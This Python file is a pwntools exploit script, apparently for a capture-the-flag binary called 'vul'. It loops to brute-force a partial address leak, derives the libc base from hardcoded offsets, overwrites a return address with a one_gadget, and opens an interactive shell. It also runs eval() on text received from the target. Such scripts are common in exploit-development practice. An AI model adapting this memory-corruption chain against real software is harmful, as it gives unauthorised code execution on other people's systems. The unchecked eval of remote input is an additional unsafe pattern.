#!/usr/bin/env python
from pwn import *
i = 0
while True:
	libc_base = 0
	i = i + 1
	p = process('./vul', env={'LD_PRELOAD':'./libc.so.6_64'})
	try:
		p.recvuntil("Choice:")
		p.send('1')
		p.recvuntil('?')
		p.send('2')
		p.recvuntil('?')
		p.send('0')
		p.recvuntil("Questpn: ")
		questpn = p.recvuntil("=")[:-1]
		answer = str(eval(questpn))
		payload = answer.ljust(0x30, '\x00') + '\x5c'
		p.send(payload)
		p.recvuntil("Level ")
		addr_l8 = int(p.recvuntil("Questpn: ")[:-10])
		
		if addr_l8 < 0:
			addr_l8 = addr_l8 + 0x100000000
		addr = addr_l8 + 0x7f8b00000000
		if hex(addr)[-2:] == '0b':	#__IO_file_overflow+EB
			libc_base = addr - 0x7c90b
		elif hex(addr)[-2:] == 'd2':	#puts+1B2
			libc_base = addr - 0x70ad2
		elif hex(addr)[-3:] == '600':#_IO_2_1_stdout_
			libc_base = addr - 0x3c2600		
		elif hex(addr)[-3:] == '400':#_IO_file_jumps
			libc_base = addr - 0x3be400	
		elif hex(addr)[-2:] == '83':	#_IO_2_1_stdout_+83	
			libc_base = addr - 0x3c2683	
		elif hex(addr)[-2:] == '32':	#_IO_do_write+C2
			libc_base = addr - 0x7c370 - 0xc2			
		elif hex(addr)[-2:] == 'e7':	#_IO_do_write+37
			libc_base = addr - 0x7c370 - 0x37		
		one_gadget = libc_base + 0x45526
		log.info("try time %d, leak addr %#x, libc_base at %#x, one_gadget at %#x" %(i, addr, libc_base, one_gadget))
		if libc_base == 0:
			p.close()
			continue
		questpn = p.recvuntil("=")[:-1]
		answer = str(eval(questpn))
		payload = answer.ljust(0x38, '\x00') + p64(one_gadget)
		p.send(payload)
		p.recv(timeout = 1)	
		p.recv(timeout = 1)
	except EOFError:
		p.close()
		continue
	else:
		p.interactive()
		break
